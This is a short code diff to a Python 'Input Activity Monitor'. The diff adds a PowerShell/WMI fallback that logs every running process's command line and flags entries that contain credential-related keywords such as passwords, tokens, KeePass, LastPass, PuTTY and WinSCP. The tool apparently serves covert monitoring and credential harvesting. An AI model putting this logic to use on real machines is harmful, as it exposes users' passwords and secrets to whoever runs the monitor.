@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python3
+#!/usr/bin/env python3
 """
 FLLC - Input Activity Monitor v2
 ======================================
@@ -602,8 +602,40 @@ class InputMonitor:
                             ]):
                                 self._log_activity('interesting_process', entry)
                 else:
-                    # Fallback: Use WMI via PowerShell
-                    pass
+                    # Fallback: Use WMI via PowerShell subprocess
+                    try:
+                        wmi_cmd = (
+                            'Get-CimInstance Win32_Process | '
+                            'Select-Object ProcessId,Name,CommandLine,CreationDate | '
+                            'ConvertTo-Json -Compress'
+                        )
+                        result = subprocess.run(
+                            ['powershell', '-NoProfile', '-Command', wmi_cmd],
+                            capture_output=True, text=True, timeout=15
+                        )
+                        if result.returncode == 0 and result.stdout.strip():
+                            procs = json.loads(result.stdout)
+                            if isinstance(procs, dict):
+                                procs = [procs]
+                            for proc in procs:
+                                entry = {
+                                    'timestamp': datetime.now().isoformat(),
+                                    'pid': proc.get('ProcessId', 0),
+                                    'name': proc.get('Name', ''),
+                                    'cmdline': proc.get('CommandLine', '') or '',
+                                    'source': 'wmi_fallback'
+                                }
+                                with open(proc_log, 'a', encoding='utf-8') as f:
+                                    f.write(json.dumps(entry, ensure_ascii=False) + '\n')
+                                cmdline_lower = entry['cmdline'].lower()
+                                if any(k in cmdline_lower for k in [
+                                    'password', 'secret', 'token', 'ssh ', 'rdp',
+                                    'vpn', 'keepass', 'lastpass', '1password',
+                                    'putty', 'winscp', 'filezilla', 'ftp'
+                                ]):
+                                    self._log_activity('interesting_process', entry)
+                    except Exception:
+                        pass
             except Exception:
                 pass
             time.sleep(interval)
